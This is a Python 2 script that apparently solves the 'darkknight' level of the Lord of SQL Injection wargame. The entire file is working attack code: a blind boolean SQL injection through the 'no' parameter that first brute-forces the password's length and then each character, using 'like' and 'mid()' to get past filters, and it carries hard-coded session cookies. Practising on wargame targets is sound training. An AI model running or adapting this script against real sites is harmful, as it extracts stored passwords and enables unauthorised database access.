# -*- coding:utf-8 -*-

import urllib2

query_ok = "<h2>Hello admin"
key="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXZY"

print "[*] Start Search pw Length "

for len in range(1,100):
    url = 'http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=Loddy&no=1||length(pw)%20like%20'+str(len)
    request = urllib2.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'})
    request.add_header("COOKIE", "PHPSESSID=9g5q9em05r8ke6d779qkg6ipm2")
    read = urllib2.urlopen(request).read()
    if read.find(query_ok) != -1:
        print "\t%s = Correct"%(len)
        length = len
        break
    else :
        print "\t%s = Incorrect"%(len)

print "\n",
print "[*] Start Search pw Value"

def find_pw(test,pw):
    url2 = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=Loddy&no=1||mid(pw," + str(pw) + ",1)%20like%20\"{}\"".format(str(key[test]))
    request = urllib2.Request(url2, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'})
    request.add_header("COOKIE", "PHPSESSID=c45u9ekpnrmqctmqbocdsuead3")
    read = urllib2.urlopen(request).read()
    return read

for pw in range(1,length+1):
    for test in range(0,63):
        read = find_pw(test,pw)
        if read.find(query_ok) != -1:
            print "\t(pw,%d,1) = {}".format(key[test]) %pw
            break
